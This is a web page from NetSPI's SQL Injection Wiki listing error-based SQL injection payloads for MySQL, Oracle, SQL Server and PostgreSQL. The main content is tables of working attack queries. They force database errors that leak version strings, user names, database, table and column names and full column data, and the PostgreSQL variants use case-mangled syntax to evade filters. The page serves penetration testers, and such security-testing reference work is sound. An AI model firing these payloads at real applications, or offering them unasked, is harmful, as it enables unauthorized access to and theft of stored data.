<html>

<head>
  <meta charset="utf-8">
  <title>Error Based Injection | NetSPI SQL Injection Wiki</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="../../assets/scss/index.css%3F1571409135814090317.css" />
  <link rel="stylesheet" href="../../assets/scss/nav.css%3F1571409135814090317.css" />
  <link rel="stylesheet" href="../../assets/scss/tab.css%3F1571409135814090317.css" />
  <!-- We're going to load JS up top, this makes sure all of our painting is done hopefully in one sweep  -->
  <script src="../../assets/javascripts/cash.min.js"></script>
  <script type="text/javascript" async src="../../assets/javascripts/index.js%3F1571409135814090317"></script>
  
  <script type="text/javascript" async src="../../assets/javascripts/tab.js%3F1571409135814090317"></script>
  
  <meta name="theme-color" content="#ffffff">
  <meta property="og:type" content="website" />
  <meta property="og:title" content="NetSPI SQL Injection Wiki" />
  <meta property="og:description" content="Error based SQL Injections are exploited through triggering errors in the database when invalid inputs are passed to it." />
  <meta property="og:image" content="/assets/images/facebookCard.jpg" />
  <meta name="twitter:title" content="NetSPI SQL Injection Wiki" />
  <meta name="twitter:description" content="Error based SQL Injections are exploited through triggering errors in the database when invalid inputs are passed to it." />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:image" content="/assets/images/twitterCard.jpg">
  <meta name="twitter:site" content="@netspi" />
  <meta name="twitter:creator" content="@netspi" />
  <meta name="description" content="Error based SQL Injections are exploited through triggering errors in the database when invalid inputs are passed to it.">
  <meta name="keywords" content="netspi, sql injection, wiki, sqli, sql, injection, netspy, network security professionals, oracle, mysql, sqlserver, mssql, cheat sheet, cheat, sheet,error based, error-based, error">
  <link rel="author" href="https://netspi.com" />
  <link rel="shortcut icon" href="../../assets/images/favicon.ico">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
</head>

<body class="preload">
  <div class="mobile"></div>
  <div id="contentWrapper">
    <div id="topBar">
      <div class="n-nav-icon default">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
      </div>
      <div id="logoContainer">
      <a href="https://netspi.com"><img src="../../assets/images/logo.png%3F1571409135814090317" /></a><br/>
      </div>
    </div>
    <div class="n-navbar default">
      <ul>
  
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/" href="../../index.html">
      
    <div>Home</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" target="_blank" rel="noopener" href="https://netspi.com">
    
    <div>About Us</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/detection" href="../../detection.html">
      
    <div>Injection Detection</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/dbmsIdentification/" href="../../dbmsIdentification/index.html">
      
    <div>DBMS Identification</div>
    </a>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/injectionTypes/" href="../index.html">
          
          <div>Injection Types</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/errorBased/" href="index.html">
          
          <div>Error Based Injection</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/unionBased/" href="../unionBased/index.html">
          
          <div>Union Based Injection</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/blindBased/" href="../blindBased/index.html">
          
          <div>Blind Based Injection</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/injectionTechniques/" href="../../injectionTechniques/index.html">
          
          <div>Injection Techniques</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/conditionalStatements/" href="../../injectionTechniques/conditionalStatements/index.html">
          
          <div>Conditional Statements</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/injectionPlacement/" href="../../injectionTechniques/injectionPlacement/index.html">
          
          <div>Injection Placement</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/obfuscation/" href="../../injectionTechniques/obfuscation/index.html">
          
          <div>Injection Obfuscation</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/attackQueries/" href="../../attackQueries/index.html">
          
          <div>Attack Queries</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/informationGathering/" href="../../attackQueries/informationGathering/index.html">
          
          <div>Information Gathering</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/dataTargeting/" href="../../attackQueries/dataTargeting/index.html">
          
          <div>Data Targeting</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/privilegeEscalation/" href="../../attackQueries/privilegeEscalation/index.html">
          
          <div>Privilege Escalation</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/executingOSCommands/" href="../../attackQueries/executingOSCommands/index.html">
          
          <div>Executing OS Commands</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/readingAndWritingFiles/" href="../../attackQueries/readingAndWritingFiles/index.html">
          
          <div>Reading and Writing Files</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/lateralMovement/" href="../../attackQueries/lateralMovement/index.html">
          
          <div>Lateral Movement</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/dataExfiltration/" href="../../attackQueries/dataExfiltration.html">
          
          <div>Data Exfiltration</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/persistence/" href="../../attackQueries/persistence/index.html">
          
          <div>Persistence</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
          <div>Misc.</div>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/contributors" href="../../misc/contributors.html">
          
          <div>Contributors</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/references/" href="../../misc/references/index.html">
          
          <div>References</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/sandboxes/" href="../../misc/sandboxes/index.html">
          
          <div>Sandboxes</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/tools/" href="../../misc/tools/index.html">
          
          <div>Tools</div>
        </a>
      </li>
      
    </ul>
  </li>
   
</ul>

    </div>
    <div id="contentContainer">
      <div id="tabs" class="tabs" data-tabs-ignore-url="false">

<input class="tabInput"  name="tabs" type="radio" id="mysql"/>
<label class="tabLabel" onClick="updateTab('mysql',false)" for="mysql">MySQL</label>
<div id="tabPanel" class="tabPanel">
     <h3>Error Based</h3>

<p class="pageDescription">Error based injections are exploited through triggering errors in the database when invalid inputs are passed to it. The error messages can be used to return the full query results, or gain information on how to restructure the query for further exploitation.</p>


<table class="table table-striped table-hover">
    <thead>
        <tr>
            <th>Description</th>
            <th align="left">Query</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>XML Parse Error</td>
            <td>SELECT extractvalue(rand(),concat(0x3a,(select version())))</td>
        </tr>
        <tr>
            <td>Double Query</td>
            <td>SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(<strong>SELECT username FROM USERS LIMIT 0,1</strong>),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)<br><br><em>Increment Limit 0,1 to Limit 1,1 to begin cycling through data</em></td>
        </tr>
        <tr>
            <td>Get Current Database</td>
            <td>SELECT a()</td>
        </tr>
    </tbody>
</table>

</div>

<input class="tabInput"  name="tabs" type="radio" id="oracle"/>
<label class="tabLabel" onClick="updateTab('oracle',false)" for="oracle">Oracle</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="error-based">Error Based</h3>

<p class="pageDescription">Error based injections are exploited through triggering errors in the database when invalid inputs are passed to it. The error messages can be used to return the full query results, or gain information on how to restructure the query for further exploitation.</p>

<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th align="left">Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Invalid HTTP Request</td>
      <td>SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual</td>
    </tr>
    <tr>
      <td>CTXSYS.DRITHSX.SN</td>
      <td>SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual</td>
    </tr>
    <tr>
      <td>Invalid XPath</td>
      <td>SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual</td>
    </tr>
    <tr>
      <td>Invalid XML</td>
      <td>SELECT to_char(dbms_xmlgen.getxml('select "'||(select user from sys.dual)||'" FROM sys.dual')) FROM dual</td>
    </tr>
    <tr>
      <td>Invalid XML</td>
      <td>SELECT rtrim(extract(xmlagg(xmlelement("s", username || ',')),'/s').getstringval(),',') FROM all_users</td>
    </tr>
  </tbody>
</table>

</div>

<input class="tabInput"  name="tabs" type="radio" id="sqlserver"/>
<label class="tabLabel" onClick="updateTab('sqlserver',false)" for="sqlserver">SQL Server</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="error-based">Error Based</h3>

<p class="pageDescription">Error based injections are exploited through triggering errors in the database when invalid inputs are passed to it. The error messages can be used to return the full query results, or gain information on how to restructure the query for further exploitation.</p>

<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th align="left">Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Explicit conversion</td>
      <td>SELECT convert(int,(SELECT @@version))<br/>SELECT cast((SELECT @@version) as int)</td>
    </tr>
    <tr>
      <td>Implicit conversion</td>
      <td>SELECT 1/@@version</td>
    </tr>
  </tbody>
</table>

<h3 id="mssql-cast-function">MSSQL CAST Function Examples</h3>
<p class="readableText">Any of the below queries can be rewritten using the <code>convert</code> function or as an implicit conversion.</p>
<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Inject a CAST function into the current query</td>
      <td>SELECT CAST(@@version as int)</td>
    </tr>
    <tr>
      <td>Show System User</td>
      <td>SELECT CAST(SYSTEM_USER as int);</td>
    </tr>

    <tr>
      <td>Show all databases in a single line with xml path</td>
      <td>SELECT CAST((SELECT name,',' FROM master..sysdatabases FOR XML path('')) as int)<br> SELECT CAST((SELECT name AS "data()" FROM master..sysdatabases FOR xml path('')) AS int);</td>
    </tr>

    <tr>
      <td>Show Server Name</td>
      <td>SELECT CAST(@@SERVERNAME as int);</td>
    </tr>

    <tr>
      <td>Show Service Name</td>
      <td>SELECT CAST(@@SERVICENAME as int);</td>
    </tr>

    <tr>
      <td>Show List of Databases<br> <i>Note: The query below must be executed in one line.</i></td>
      <td>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = '';<br> SELECT @listStr = @listStr + Name + ',' FROM master..sysdatabases;<br> SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</td>
    </tr>

    <tr>
      <td>Show List of Tables<br> <i>Note: The query below must be executed in one line.</i></td>
      <td>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);<br> SET @listStr = '';SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..sysobjects WHERE type = 'U';<br> SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput
        as int);</td>
    </tr>

    <tr>
      <td>Show List of Columns<br> <i>Note: The query below must be executed in one line.</i></td>
      <td>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = '';<br> SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..syscolumns WHERE id=object_id('MYTABLE');<br> SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);select
        cast(@myoutput as int);</td>
    </tr>

    <tr>
      <td>Show COLUMN Data<br><i>Note: The query below must be executed in one line.<br>Replace MYCOLUMN with * to select all columns</i></td>
      <td>DECLARE @listStr VARCHAR(MAX);<br> DECLARE @myoutput VARCHAR(MAX);<br> SET @listStr = '';<br> SELECT @listStr = @listStr + MYCOLUMN + ',' FROM MYDATABASE..MYTABLE;<br> SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1)<br> SELECT CAST(@myoutput
        as int);</td>
    </tr>

    <tr>
      <td>Show database name one at a time<br><i>Note: Increment the inner top value to get the next record</i></td>
      <td>SELECT TOP 1 CAST(name as int)<br> FROM sysdatabases<br> WHERE name in (SELECT TOP 2 name FROM sysdatabases ORDER BY name ASC)<br> ORDER BY name DESC</td>
    </tr>
  </tbody>
</table>

</div>

<input class="tabInput"  name="tabs" type="radio" id="postgresql"/>
<label class="tabLabel" onClick="updateTab('postgresql',false)" for="postgresql">PostgreSQL</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="error-based">Error Based</h3>

<p class="pageDescription">Error based injections are exploited through triggering errors in the database when invalid inputs are passed to it. The error messages can be used to return the full query results, or gain information on how to restructure the query for further exploitation.</p>

<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th align="left">Query</th>
    </tr>
  </thead>
  <tbody>
	<tr>
      <td>,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)</td>
	</tr>
	<tr>
	  <td>,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--</td>
	</tr>
	<tr>
	  <td>,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=data_column+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--</td>
	</tr>
	<tr>
	  <td>,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)</td>
    </tr>
  </tbody>
</table>

</div>

</div>

      <div><div>
  <br/>
  <p>© 2019 Copyright by NetSPI. All rights reserved.</p>
</div>
</div>
    </div>
  </div>
</body>
</html>
